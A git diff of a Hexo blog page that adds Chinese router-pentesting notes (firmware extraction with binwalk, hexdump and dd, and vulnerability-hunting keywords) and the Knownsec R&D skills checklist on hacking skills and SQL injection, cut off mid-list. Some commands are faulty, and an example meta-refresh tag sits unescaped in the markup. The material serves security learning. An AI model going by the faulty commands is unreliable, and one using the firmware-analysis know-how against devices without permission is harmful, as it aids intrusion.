@@ -84,15 +84,15 @@
 
 
 
-<meta name="description">
+<meta name="description" content="Information Security">
 <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
+<meta property="og:title" content="xl7dev">
 <meta property="og:url" content="http://yoursite.com/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description">
+<meta property="og:site_name" content="xl7dev">
+<meta property="og:description" content="Information Security">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hexo">
-<meta name="twitter:description">
+<meta name="twitter:title" content="xl7dev">
+<meta name="twitter:description" content="Information Security">
 
 
 
@@ -115,7 +115,7 @@
 
   <link rel="canonical" href="http://yoursite.com/"/>
 
-  <title> Hexo </title>
+  <title> xl7dev </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="">
@@ -148,11 +148,11 @@
   <div class="custom-logo-site-title">
     <a href="/"  class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
-      <span class="site-title">Hexo</span>
+      <span class="site-title">xl7dev</span>
       <span class="logo-line-after"><i></i></span>
     </a>
   </div>
-  <p class="site-subtitle"></p>
+  <p class="site-subtitle">blog</p>
 </div>
 
 <div class="site-nav-toggle">
@@ -238,8 +238,8 @@
             
               
                 
-                <a class="post-title-link" href="/2016/06/23/hello-world/" itemprop="url">
-                  Hello World
+                <a class="post-title-link" href="/2016/06/23/pentest/" itemprop="url">
+                  Unbenannt
                 </a>
               
             
@@ -252,7 +252,7 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">Veröffentlicht am</span>
-            <time itemprop="dateCreated" datetime="2016-06-23T00:59:58+08:00" content="2016-06-23">
+            <time itemprop="dateCreated" datetime="2016-06-23T01:59:30+08:00" content="2016-06-23">
               2016-06-23
             </time>
           </span>
@@ -282,17 +282,2032 @@
       
         
           
-            <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="external">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="external">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="external">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="external">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="external">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="external">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="external">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="external">Deployment</a></p>
+            <h2 id="Router-pentest"><a href="#Router-pentest" class="headerlink" title="Router pentest"></a>Router pentest</h2><h3 id="Router-download"><a href="#Router-download" class="headerlink" title="Router download"></a>Router <a href="ftp://ftp2.dlink.com/" target="_blank" rel="external">download</a></h3><h3 id="IDA-Mips-plugins"><a href="#IDA-Mips-plugins" class="headerlink" title="IDA Mips plugins"></a>IDA Mips plugins</h3><h4 id="1-Download"><a href="#1-Download" class="headerlink" title="1) Download"></a>1) Download</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; git clone https://github.com/devttys0/ida.git</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>将下载中的ida/plugins/*.py复制到ida安装目录中的plugins/的目录下,把scripts复制到ida根目录下</p>
+</blockquote>
+<h4 id="2-Install-binwalk"><a href="#2-Install-binwalk" class="headerlink" title="2) Install binwalk"></a>2) Install binwalk</h4><blockquote>
+<p>Debian/ubuntu</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt; git clone https://raw.githubusercontent.com/devttys0/binwalk</span><br><span class="line">&gt; cd biwalk &amp;&amp; ./deps.sh</span><br><span class="line">&gt; binwalk</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/usr/local/bin/binwalk&quot;, line 57, in &lt;module&gt;</span><br><span class="line">    main()</span><br><span class="line">  File &quot;/usr/local/bin/binwalk&quot;, line 29, in main</span><br><span class="line">    with binwalk.Modules() as modules:</span><br><span class="line">AttributeError: __exit__</span><br><span class="line">&gt; sudo apt-get uninstall binwalk</span><br><span class="line">&gt; sudo apt-get install binwalk</span><br><span class="line">&gt; binwalk</span><br></pre></td></tr></table></figure>
+<h3 id="路由器固件提取"><a href="#路由器固件提取" class="headerlink" title="路由器固件提取"></a>路由器固件提取</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 通过厂商提供的更新网站下载</span><br><span class="line">2. 从路由器的flash中提取固件</span><br></pre></td></tr></table></figure>
+<h4 id="手动提取文件系统"><a href="#手动提取文件系统" class="headerlink" title="手动提取文件系统"></a>手动提取文件系统</h4><p>文件内容检索步骤如下：</p>
+<ol>
+<li>“strings|grep”检索文件系统magic签名头</li>
+<li>“hexdump|grep”检索magic签名偏移</li>
+<li>“dd|file”确定magic签名偏移处的文件类型</li>
+</ol>
+<h4 id="1-检索magic"><a href="#1-检索magic" class="headerlink" title="1)检索magic"></a>1)检索magic</h4><p>常用文件系统头部特征如下：</p>
+<ol>
+<li>cramfs文件系统头部特征字符为”0x28cd3d45”</li>
+<li>squashfs文件系统头部特征字符大致有：sqsh、hsqs、qshs、shsq、hsqt、tqsh、sqlz<blockquote>
+<p>检查是否存在某个文件系统头部特征和magic签名</p>
+</blockquote>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;strings firmware.bin|grep `python -c &apos;print &quot;\x28\xcd\x3d\x45&quot;&apos;`</span><br><span class="line">&gt;strings firmware.bin|grep `python -c &apos;print &quot;\x45\x3d\xcd\x28&quot;&apos;`</span><br><span class="line">&gt;strings firmware.bin|grep &apos;hsqs&apos;</span><br><span class="line">hsqs</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>确认文件系统</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt; hexdump -C firmware.bin|grep -n &apos;hsqs&apos;    </span><br><span class="line">88240:00160090  68 73 71 73 9d 08 00 00  ab c0 ba 51 00 00 04 00  |hsqs.......Q....|</span><br><span class="line">&gt; dd if=firmware.bin bs=1 count=100 skip=1441936 of=squash</span><br><span class="line">100+0 records in</span><br><span class="line">100+0 records out</span><br><span class="line">100 bytes transferred in 0.000336 secs (297679 bytes/sec)</span><br><span class="line">&gt; file squash</span><br><span class="line">squash: Squashfs filesystem, little endian, version 4.0, 1567690239 bytes, 2205 inodes, blocksize: 0 bytes, created: Sat Jan  4 16:17:04 2020</span><br></pre></td></tr></table></figure>
+<p>注：在偏移0x00160090(1441936)处发现了hsqs,之所以复制100字节的数据，是因为squashfs文件系统的头部校验不会操过100字节</p>
+<p>3.手动提取文件系统<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; dd if=firmware.bin bs=1 count=1567690239 skip=1441936 of=kernel.squash</span><br><span class="line">6168576+0 records in</span><br><span class="line">6168576+0 records out</span><br><span class="line">6168576 bytes transferred in 11.807186 secs (522443 bytes/sec)</span><br><span class="line">&gt; file -m filesystems-hsqs kernel.squash</span><br><span class="line">kernel.squash: Squashfs filesystem, little endian, version 4.0, 1567690239 bytes, 2205 inodes, blocksize: 0 bytes, created: Sat Jan  4 16:17:04 2020</span><br><span class="line">&gt; unsquashfs_all.sh kernel.squash</span><br></pre></td></tr></table></figure></p>
+<h3 id="自动提取文件系统"><a href="#自动提取文件系统" class="headerlink" title="自动提取文件系统"></a>自动提取文件系统</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; binwalk -Me firmware.bin</span><br></pre></td></tr></table></figure>
+<p>###路由器漏洞挖掘</p>
+<h4 id="绑定IP"><a href="#绑定IP" class="headerlink" title="绑定IP"></a>绑定IP</h4><blockquote>
+<p>一般搜索如下关键字</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bind</span><br><span class="line">listener</span><br><span class="line">getbr0IP</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/06/23/knownsec/" itemprop="url">
+                  Unbenannt
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Veröffentlicht am</span>
+            <time itemprop="dateCreated" datetime="2016-06-23T01:59:30+08:00" content="2016-06-23">
+              2016-06-23
+            </time>
+          </span>
 
           
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="知道创宇研发技能表v3-0"><a href="#知道创宇研发技能表v3-0" class="headerlink" title="知道创宇研发技能表v3.0"></a>知道创宇研发技能表v3.0</h1><p>2015/8/21 发布<br>by @知道创宇(www.knownsec.com) @余弦 &amp; 404团队</p>
+<p>2015/10/17采用md重新编写 <a href="https://github.com/xl7dev" target="_blank" rel="external">xl7dev</a></p>
+<p>后续动态请关注微信公众号：<strong><em>Lazy-Thought</em></strong></p>
+<h2 id="0x01-说明"><a href="#0x01-说明" class="headerlink" title="0x01 说明"></a>0x01 说明</h2><h3 id="关于知道创宇"><a href="#关于知道创宇" class="headerlink" title="关于知道创宇"></a>关于知道创宇</h3><ul>
+<li>知行合一 | 守正出奇</li>
+<li>知道创宇是一家黑客文化浓厚的安全公司，愿景是让互联网更好更安全</li>
+</ul>
+<h3 id="本技能表为知道创宇研发工程师的技能树集合，是的，很庞大"><a href="#本技能表为知道创宇研发工程师的技能树集合，是的，很庞大" class="headerlink" title="本技能表为知道创宇研发工程师的技能树集合，是的，很庞大"></a>本技能表为知道创宇研发工程师的技能树集合，是的，很庞大</h3><ul>
+<li>聪明的人，会根据每个tip自驱动扩展</li>
+<li>不聪明的人，坐等别人手把手，不仅不适合知道创宇，也不适合任何有极客精神的公司</li>
+</ul>
+<p><i class="icon ion-edit">附件标志是我们推荐的附加资源，感谢资源提供者</i></p>
+<p><a href="https://github.com/evilcos/papers/blob/master/Knownsec_RD_Checklist_v3.0.zip" target="_blank" rel="external">知道创宇研发技能表v3.0离线版打包下载</a><i class="icon ion-ios-cloud-download"></i></p>
+<h2 id="0x02通用技能"><a href="#0x02通用技能" class="headerlink" title="0x02通用技能"></a>0x02通用技能</h2><h3 id="1）公司与个人"><a href="#1）公司与个人" class="headerlink" title="1）公司与个人"></a>1）公司与个人</h3><ul>
+<li>公司是盈利性组织</li>
+<li>个人和公司必须双赢</li>
+<li>在认同公司理念且能够给公司创造足够价值的基础上，为个人发展而工作</li>
+</ul>
+<h3 id="2）WHO-AM-I"><a href="#2）WHO-AM-I" class="headerlink" title="2）WHO AM I"></a>2）WHO AM I</h3><h4 id="gt-黑客是守正出奇且具备创造力的群体"><a href="#gt-黑客是守正出奇且具备创造力的群体" class="headerlink" title="&gt; 黑客是守正出奇且具备创造力的群体"></a>&gt; 黑客是守正出奇且具备创造力的群体</h4><blockquote>
+<ul>
+<li><p>[-] 守正出奇</p>
+<blockquote>
+<ul>
+<li>这条正道/底线得坚守</li>
+<li>但如果太过正就迂腐了，为了搞定任务有时得出奇招</li>
+</ul>
+</blockquote>
+</li>
+<li><p>[-] 创造力</p>
+<blockquote>
+<ul>
+<li>一个没有创造力的人是多么的可怜，对于团队来说也是一种耻辱</li>
+<li>本技能表的本质目的只有一个：引导你拥有足够的创造力</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+<ul>
+<li><p>黑客也可以是一种思维方式</p>
+</li>
+<li><p>我们需要对得起名片上的那个头衔：工程师、研究员</p>
+</li>
+</ul>
+<h4 id="gt-牛人姿态"><a href="#gt-牛人姿态" class="headerlink" title="&gt; 牛人姿态"></a>&gt; 牛人姿态</h4><blockquote>
+<ul>
+<li>即使现在不是牛人，也得具备这样的姿态</li>
+<li>没有一定扎实内功与远见的人很少有这样的姿态</li>
+<li>拥有不将就的做事风格，迟早是牛人</li>
+</ul>
+</blockquote>
+<h3 id="3）如何做事"><a href="#3）如何做事" class="headerlink" title="3）如何做事"></a>3）如何做事</h3><h4 id="gt-方法论"><a href="#gt-方法论" class="headerlink" title="&gt; 方法论"></a>&gt; 方法论</h4><ul>
+<li>完成一件事有好几条途径，优秀的人的途径最短</li>
+<li>任务拆分很容易得出做事的方法论</li>
+<li>好的「方法论」会让你具备更强的「创造力」！时刻问自己：「是否具备创造力？」</li>
+</ul>
+<h4 id="gt-任务拆分"><a href="#gt-任务拆分" class="headerlink" title="&gt; 任务拆分"></a>&gt; 任务拆分</h4><ul>
+<li>成长过程会经历：能力越大、责任越大、事情越多</li>
+<li>思路<blockquote>
+<ul>
+<li>拆分细化为多个点</li>
+<li>[-] 排好优先级<blockquote>
+<ul>
+<li>[-] 任务四象限，决定优先级<blockquote>
+<ul>
+<li>[-] 紧急重要<blockquote>
+<ul>
+<li>赶紧搞定</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 重要不紧急<blockquote>
+<ul>
+<li>时刻保持关注，以免沦为「紧急重要」</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 紧急不重要<blockquote>
+<ul>
+<li>少少益善，学会拒绝</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 不紧急不重要<blockquote>
+<ul>
+<li>靠自律</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] SMART原则<blockquote>
+<ul>
+<li>[-] S：任务是否明确<blockquote>
+<ul>
+<li>不明确的任务搞起来就是浪费生命</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] M：任务是否可度量<blockquote>
+<ul>
+<li>不可度量如何体现价值？</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] A：任务是否可搞定<blockquote>
+<ul>
+<li>搞不定就不应该接，接就得有魄力搞定</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] R：任务的相关性如何<blockquote>
+<ul>
+<li>决定了任务的价值，相关性越高越能体现价值，比如这个任务搞定了能让团队获得公司、客户等更大的认可</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] T：任务的时间<blockquote>
+<ul>
+<li>Timeline：任务时间轴，什么时间点需要搞定什么</li>
+<li>Deadline：任务的最后期限，做评估时最好提前，因为总会有各种意外或拖延本性</li>
+<li>Timeline上一些很关键的时间点我们可以称为里程碑，搞定每个里程碑应该庆祝下</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>自己欠缺什么，立马发现</li>
+<li>是否需要寻求帮助，谁能帮你，自己单干？ Arrow Link</li>
+<li>团队<blockquote>
+<ul>
+<li>士气第一</li>
+<li>[-] 当你有团队时，分配与调度好任务很关键<blockquote>
+<ul>
+<li>做得好是真并发</li>
+<li>做不好会死锁</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+<h4 id="gt-沟通、反馈与责任"><a href="#gt-沟通、反馈与责任" class="headerlink" title="&gt; 沟通、反馈与责任"></a>&gt; 沟通、反馈与责任</h4><ul>
+<li>一个无沟通能力的人，要么是天才，要么是不可爱的人，不过天才也就寥寥无几而已，你并不是</li>
+<li>[-] 反馈要及时<blockquote>
+<ul>
+<li>避免出问题不反馈，影响进度</li>
+<li>方式<blockquote>
+<ul>
+<li>正式的：邮件</li>
+<li>临时的：微信等即时通信</li>
+<li>着急的：给个电话</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>工作有大小，责任心无大小</li>
+<li>[-] 周报的透明<blockquote>
+<ul>
+<li>[-] 意义：大家互相了解工作与心得，有利于自己的判断与成长<blockquote>
+<ul>
+<li>观察是一种多重要的技能</li>
+<li>不是单纯的给领导汇报工作</li>
+</ul>
+</blockquote>
+</li>
+<li>周报需体现本周工作总结、下周工作计划、心得/问题/建议（我们叫唧唧歪歪）</li>
+<li>周报可以很好体现一个人的<blockquote>
+<ul>
+<li>总结能力</li>
+<li>计划能力</li>
+<li>[-] 分享能力<blockquote>
+<ul>
+<li>想象下：一个人从来没有心得/问题/建议的沉淀或反馈，这个人是一个相对封闭的人，在团队作战中很难达到默契</li>
+<li>当然，这种分享能力远不仅仅是在周报这种形式里</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+<h4 id="gt-团队意识"><a href="#gt-团队意识" class="headerlink" title="&gt; 团队意识"></a>&gt; 团队意识</h4><ul>
+<li>[-] 很多人都说自己具备足够好的团队意识，但是有些人却并不是这样<blockquote>
+<ul>
+<li>举个小例子：一个10人团队约定早上10点开会，而你迟到了10分钟，对于团队来说你浪费了整个团队100分钟（10人*10分钟）的生命。有些人无羞愧之心要么是意识不到这点，要么这个团队的风气就是这样…</li>
+</ul>
+</blockquote>
+</li>
+<li>团队意识是建立在互相信任的基础上</li>
+<li>[-] Leader最关键，优秀的Leader一定会有个优秀团队<blockquote>
+<ul>
+<li>兵熊熊一个</li>
+<li>将熊熊一窝</li>
+</ul>
+</blockquote>
+</li>
+<li>如何拥有个优秀的团队是一个复杂的话题</li>
+</ul>
+<h4 id="4）成长"><a href="#4）成长" class="headerlink" title="4）成长"></a>4）成长</h4><ul>
+<li>[-] 新事物的敏感性<blockquote>
+<ul>
+<li>保持好奇心</li>
+<li>不要局限在自己的圈子，适当跨界吸收灵感</li>
+<li>订阅国内外优秀博客/资源，深蓝阅读不错</li>
+<li>选择性参与一些必要的会议，听必要的主题，讨论必要的话题</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 关于知识<blockquote>
+<ul>
+<li>对知识的渴望程度决定了前进动力的大小</li>
+<li>当知识很廉价地摆在你面前，你反而不会珍惜</li>
+<li>对知识保持敬畏之心</li>
+</ul>
+</blockquote>
+</li>
+<li>不要让自己成为矫情/浮夸的人</li>
+<li>[-] 和比你厉害的人在一起，和一流的人工作<blockquote>
+<ul>
+<li>指点往往是精华</li>
+<li>[-] 杜绝笨蛋爆炸<blockquote>
+<ul>
+<li>二流的人招进来的人不太可能是一流的</li>
+<li>久而久之一个团队就笨蛋爆炸了</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 思考<blockquote>
+<ul>
+<li>批判性思考</li>
+<li>[-] 换位思考<blockquote>
+<ul>
+<li>对于一个团队来说，这点太关键</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 提问的智慧<blockquote>
+<ul>
+<li>遇到问题先独立思考，尝试独立解决，尽最大努力后再提问</li>
+<li>提问时，礼貌很关键（对知识的敬畏），清晰表达很关键</li>
+<li>解决后，分享出来帮助更多需要帮助的人</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 小事心态<blockquote>
+<ul>
+<li>越基础的事越关键，越需要细心</li>
+<li>不要一味盲目追求「高级感」，而忽视「小事」/「简单事」/「基础事」</li>
+<li>基础不牢、地动山摇</li>
+<li>小事做不好，别提大事</li>
+</ul>
+</blockquote>
+</li>
+<li>无论是个人还是团队的成长都需要不断沉淀知识，没有沉淀根基不稳</li>
+</ul>
+<h3 id="5）完成的定义"><a href="#5）完成的定义" class="headerlink" title="5）完成的定义"></a>5）完成的定义</h3><h4 id="gt-比如写个PoC"><a href="#gt-比如写个PoC" class="headerlink" title="&gt;比如写个PoC"></a>&gt;比如写个PoC</h4><ul>
+<li>搞懂了目标Web应用漏洞的原理</li>
+<li>熟练运用Python各相关模块与机制</li>
+<li>[-] 熟练了解了HTTP协议<blockquote>
+<ul>
+<li>HTTP请求</li>
+<li>HTTP响应</li>
+</ul>
+</blockquote>
+</li>
+<li>代码写得够规范，让人看起来就是爽</li>
+<li>程序经过足够的测试<blockquote>
+<ul>
+<li>黑测试</li>
+<li>白测试</li>
+</ul>
+</blockquote>
+</li>
+<li>及时反馈进度<blockquote>
+<ul>
+<li>我遇到困难了</li>
+<li>我搞定了</li>
+</ul>
+</blockquote>
+</li>
+<li>更新相关文档，沉淀</li>
+</ul>
+<h3 id="6）熟练的定义"><a href="#6）熟练的定义" class="headerlink" title="6）熟练的定义"></a>6）熟练的定义</h3><p>[-] 比如熟练SQL注入</p>
+<blockquote>
+<ul>
+<li>SQL语句这门“语言”能脱离文档顺手写出</li>
+<li>[-] 主流数据库的SQL特有函数、存储过程、机制我都了如指掌<blockquote>
+<ul>
+<li>MySQL</li>
+<li>MSSQL</li>
+<li>Oracle</li>
+<li>PostgreSQL</li>
+<li>Access</li>
+<li>SQLite</li>
+<li>…</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 牛逼的工具我不仅用的顺其自然，源码还读过几遍，我能修改<blockquote>
+<ul>
+<li>sqlmap</li>
+<li>…</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 我具备创造性，而不仅仅是跟在大牛身后<blockquote>
+<ul>
+<li>研究出了几个不错的技巧</li>
+<li>发了几篇不错的Paper</li>
+<li>对外会议/沙龙等进行了几次分享</li>
+<li>写出了自己的相关工具，爽</li>
+</ul>
+</blockquote>
+</li>
+<li>我实战了N回，遇到了很多奇葩环境，我有足够的信心绕过</li>
+<li>以上这些之后，这才叫熟练！其他同理</li>
+</ul>
+</blockquote>
+<h3 id="7）好书推荐"><a href="#7）好书推荐" class="headerlink" title="7）好书推荐"></a>7）好书推荐</h3><ul>
+<li>[-] 推荐理由<blockquote>
+<ul>
+<li>[-] 打通任督二脉的书，怎能不看？<blockquote>
+<ul>
+<li>但，尽信书不如无书</li>
+</ul>
+</blockquote>
+</li>
+<li>任何科学研究最终必须至少到哲学层面，触碰到上帝的脚</li>
+<li>具体技术类书籍请见「专业技能」相关部分</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 鸡汤类<blockquote>
+<ul>
+<li>[-] 黑客与画家<blockquote>
+<ul>
+<li>[-] 印象深刻：设计者的品味<blockquote>
+<ul>
+<li>[-] 好设计是简单的设计<blockquote>
+<ul>
+<li>抓住本质</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 好设计是永不过时的设计<blockquote>
+<ul>
+<li>如果解决方法是丑陋的，那就肯定还有更好的解决方法，只是还没有发现而已</li>
+</ul>
+</blockquote>
+</li>
+<li>好设计是解决主要问题的设计</li>
+<li>好设计是启发性的设计</li>
+<li>好设计通常是有点趣味性的设计</li>
+<li>好设计是艰苦的设计</li>
+<li>好设计是看似容易的设计</li>
+<li>好设计是对称的设计</li>
+<li>好设计是模仿大自然的设计</li>
+<li>好设计是一种再设计</li>
+<li>好设计是能够复制的设计</li>
+<li>好设计往往是奇特的设计</li>
+<li>好设计是成批出现的</li>
+<li>好设计常常是大胆的设计</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 浪潮之巅<blockquote>
+<ul>
+<li>感受IT帝国的崛起与没落，我们现在站在又一个互联网浪潮之巅</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 洁癖类<blockquote>
+<ul>
+<li>重构</li>
+<li>代码整洁之道</li>
+<li>代码大全2</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 敏捷类<blockquote>
+<ul>
+<li>[-] Rework中文版<blockquote>
+<ul>
+<li>37signals团队的敏捷经验</li>
+</ul>
+</blockquote>
+</li>
+<li>高效程序员的45个习惯</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 产品类<blockquote>
+<ul>
+<li>人人都是产品经理</li>
+<li>结网</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 神书<blockquote>
+<ul>
+<li>自私的基因</li>
+<li>失控</li>
+</ul>
+</blockquote>
+</li>
+<li>…</li>
+</ul>
+<h2 id="0x03-专业技能"><a href="#0x03-专业技能" class="headerlink" title="0x03 专业技能"></a>0x03 专业技能</h2><ul>
+<li>[-] 原则<blockquote>
+<ul>
+<li>至少完整看完与练习好一本书</li>
+<li>至少过一遍官方文档</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 基础必备<blockquote>
+<ul>
+<li>[-] HTTP抓包与调试<blockquote>
+<ul>
+<li>[-] Firefox插件<blockquote>
+<ul>
+<li>[-] Firebug<blockquote>
+<ul>
+<li>抓包与各种调试</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] Tamper Data<blockquote>
+<ul>
+<li>拦截修改</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] Live Http Header<blockquote>
+<ul>
+<li>重放功能</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] Hackbar<blockquote>
+<ul>
+<li>编码解码/POST提交</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] Modify Headers<blockquote>
+<ul>
+<li>修改头部</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] Fiddler<blockquote>
+<ul>
+<li>浏览器代理神器</li>
+<li>拦截请求或响应</li>
+<li>抓包</li>
+<li>重放</li>
+<li>模拟请求</li>
+<li>编码解码</li>
+<li>[-] 第三方扩展<blockquote>
+<ul>
+<li>[-] Watcher<blockquote>
+<ul>
+<li>Web前端安全的自动审计工具</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] Wireshark<blockquote>
+<ul>
+<li>各种强大的过滤器语法</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] Tcpdump<blockquote>
+<ul>
+<li>命令行的类Wireshark抓包神器</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] Python<blockquote>
+<ul>
+<li>[-] urllib2<blockquote>
+<ul>
+<li>[-] 打开请求响应调试<blockquote>
+<ul>
+<li>编辑urllib2的do_open里的h.set_debuglevel</li>
+<li>改为h.set_debuglevel(1)，这时可以清晰看到请求响应数据，包括https</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 什么是跳转<blockquote>
+<ul>
+<li>[-] 服务端跳转<blockquote>
+<ul>
+<li>[-] 302<blockquote>
+<ul>
+<li>&lt;?php header(“Location: 3.php”); ?&gt;</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 301<blockquote>
+<ul>
+<li>&lt;?php header(“HTTP/1.1 301 Moved Permanently”); header(“Location: 2.php”); ?&gt;</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] u=urllib2.urlopen(url)后，u.url能得到服务端跳转后的地址<blockquote>
+<ul>
+<li>urllib2自己的特性</li>
+<li>所谓的会跟进去</li>
+</ul>
+</blockquote>
+</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] 客户端跳转<blockquote>
+<ul>
+<li>[-] <meta http-equiv="refresh" content="0; url=http://www.evilcos.me"><blockquote>
+<ul>
+<li>[-] htmlparse解析就行了</li>
+</ul>
+</blockquote>
+</li>
+<li>[-] location.href=”http:/“ + “/evilcos.me”;<blockquote>
+<ul>
